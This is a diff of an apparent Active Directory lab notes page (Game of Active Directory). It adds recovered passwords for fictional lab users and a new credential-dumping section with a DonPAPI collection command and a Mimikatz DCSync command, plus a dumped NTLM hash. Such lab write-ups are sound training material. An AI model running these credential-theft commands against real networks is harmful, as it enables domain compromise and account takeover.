@@ -59,13 +59,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark NORTH\eddard.stark NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark Groups: Name : Administrators distinguishedName : CN=Administrators …" />
+<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark Groups: Name : Administrators distinguishedName …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Game of Active Directory Notes"/>
-  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark NORTH\eddard.stark NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark Groups: Name : Administrators distinguishedName : CN=Administrators …"/>
+  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark Groups: Name : Administrators distinguishedName …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/goad.html"/>
   <meta property="og:type" content="article"/>
@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relayable" title="SMB Relayable">SMB Relayable</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relayable" title="SMB Relayable">SMB Relayable</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a></li><li><a class="toc-href" href="#silver-ticket" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -178,11 +178,11 @@
 </tr>
 <tr>
 <td>NORTH\arya.stark</td>
-<td></td>
+<td>Needle</td>
 </tr>
 <tr>
 <td>NORTH\eddard.stark</td>
-<td></td>
+<td>FightP3aceAndHonor!</td>
 </tr>
 <tr>
 <td>NORTH\catelyn.stark</td>
@@ -747,6 +747,18 @@
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UsernameAsPassword</span>
 </code></pre></div>
 <p><img alt="Pasted image 20250205160553.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250205160553.png"/></p>
+<h2 id="credentials-dumping">Credentials Dumping</h2>
+<h2 id="donpapi">DonPAPI</h2>
+<div class="highlight"><pre><span></span><code>donpapi<span class="w"> </span>collect<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>-d<span class="w"> </span>NORTH.local<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.1.0.11
+</code></pre></div>
+<p><img alt="Pasted image 20250205191225.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250205191225.png"/></p>
+<h2 id="mimikatz">Mimikatz</h2>
+<p>With <code>eddard.stark</code> (domain admin):</p>
+<div class="highlight"><pre><span></span><code>privilege::debug
+lsadump::dcsync /user:arya.stark
+</code></pre></div>
+<p>Dumping NTLM hash: <code>4f622f4cd4284a887228940e2ff4e709</code></p>
+<p><img alt="Pasted image 20250205194647.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250205194647.png"/></p>
 <h2 id="gpo-abuse">GPO Abuse</h2>
 <div class="highlight"><pre><span></span><code>Get-GPO -All
 </code></pre></div>
